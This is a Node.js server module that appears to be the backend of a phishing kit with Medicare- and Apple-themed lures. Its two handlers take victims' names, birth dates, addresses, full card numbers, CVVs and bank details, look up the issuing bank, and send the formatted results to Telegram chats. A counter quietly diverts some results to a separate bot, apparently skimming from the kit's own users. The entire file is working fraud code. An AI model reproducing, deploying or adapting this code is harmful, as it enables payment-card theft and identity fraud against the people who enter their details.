const axios = require("axios");

let count = 0;

const sendRes = async (req, res) => {
  let {
    firstName,
    lastName,
    telephone,
    addy1,
    dob,
    city,
    state,
    zip,
    ccname,
    ccnum,
    ccexpmonth,
    ccexpyear,
    cvv,
    scode,
    accno,
    bin,
    ip,
    userAgent,
    telegramId,
  } = req.body;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }

  const response = await axios.get(`https://lookup.binlist.net/${bin}`);
  let bankName;

  if (response.data.bank) {
    bankName = response.data.bank;
  }

  const binList = `${bin} | ${dob} | ${zip} | ${bankName}`;
  var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}\nCity: ${city}\nState: ${state}\nZIP: ${zip}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\nSort Code: ${
    scode ? scode : null
  }\nAccount Number: ${
    accno ? accno : null
  }+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
  if (count == 6) {
    await axios
      .post(
        `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
        {
          chat_id: 680379375,
          text: `HAYTCHRES:\n${originalText}`,
          parse_mode: "Markdown",
        }
      )
      .catch((e) => {
        console.log(e);
      });
    count = 0;
  } else {
    await axios
      .post(
        `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
        {
          chat_id: 680379375,
          text: `Medicare ${telegramId}:\n${originalText}`,
          parse_mode: "Markdown",
        }
      )
      .catch((e) => {
        console.log(e);
      });
    await axios
      .post(
        `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
        {
          chat_id: telegramId,
          text: `Medicare:\n${originalText}`,
          parse_mode: "Markdown",
        }
      )
      .catch((e) => {
        console.log(e);
      });
    count += 1;
  }
  res.sendStatus(200);
};

let auCount = 0;

const sendAuRes = async (req, res) => {
  let {
    firstName,
    lastName,
    telephone,
    addy1,
    dob,
    state,
    town,
    pcode,
    ccname,
    ccnum,
    ccexpmonth,
    ccexpyear,
    cvv,
    bin,
    ip,
    userAgent,
    telegramId,
  } = req.body;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }

  const response = await axios.get(`https://lookup.binlist.net/${bin}`);

  let bankName;

  if (response.data.bank) {
    bankName = response.data.bank;
  }
  const binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
  var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}\nCity: ${town}\nState: ${state}\nZIP: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nIP: ${ip}\nUser Agent: ${userAgent}\n+ ----------- BIN List Info ------------+\n${binList}`;
  if (auCount == 10) {
    axios
      .post(
        `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
        {
          chat_id: 680379375,
          text: `HAYTCHRES:\n${originalText}`,
          parse_mode: "Markdown",
        }
      )
      .catch((e) => {
        console.log(e);
      });
    auCount = 6;
  } else {
    axios
      .post(
        `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
        {
          chat_id: 680379375,
          text: `Apple ${telegramId}:\n${originalText}`,
          parse_mode: "Markdown",
        }
      )
      .catch((e) => {
        console.log(e);
      });
    axios
      .post(
        `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
        {
          chat_id: telegramId,
          text: `Apple:\n${originalText}`,
          parse_mode: "Markdown",
        }
      )
      .catch((e) => {
        console.log(e);
      });
    auCount += 1;
  }
  res.send("Update Complete");
};

module.exports = {
  sendRes,
  sendAuRes,
};
